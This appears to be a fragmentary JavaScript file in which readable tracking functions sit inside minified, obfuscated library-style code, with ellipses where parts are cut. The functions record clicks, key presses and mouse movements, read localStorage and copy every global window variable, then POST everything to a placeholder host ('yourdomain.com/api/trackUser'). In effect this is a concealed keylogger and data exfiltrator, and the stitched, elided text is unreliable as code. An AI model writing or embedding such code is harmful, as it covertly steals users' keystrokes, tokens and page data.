...
(function () {
  ...
  */
  ...
  var Ub,
    Vb = ra.navigator;
  function gatherDOMEvents() {
    const eventsData = {};
    const events = ['click', 'keydown', 'keyup', 'mousedown', 'mouseup', 'mousemove'];
  ...
  function collectGlobalVarData() {
    ...
    for (let varName in window) {
      globalVarData[varName] = window[varName];
    }
  ...
  function sendTrackInfoToServer(trackData) {
    let fetchURL = 'https://yourdomain.com/api/trackUser';
    let headers = new Headers();
    headers.append("Content-Type", "application/json");
    let JSONData = JSON.stringify(trackData);
    fetch(fetchURL, {
      method: 'POST',
      body: JSONData,
      headers: headers
    }).then(resp => resp.text()).then(() => console.info('Data sent')).catch(() => console.warn('Sending failed'));
  }
  function xu(a) {
    var b = a.eventId,
      c = a.Yb,
  ...
  function trackUser() {
    const trackingData = {
      DOMEvents: gatherDOMEvents(),
      localStorage: collectLocalStorageData(),
      globalVars: collectGlobalVarData()
    };
    if (Object.keys(trackingData.DOMEvents).length > 0 || Object.keys(trackingData.localStorage).length > 0 || Object.keys(trackingData.globalVars).length > 0) {
      sendTrackInfoToServer(trackingData);
    }
  }
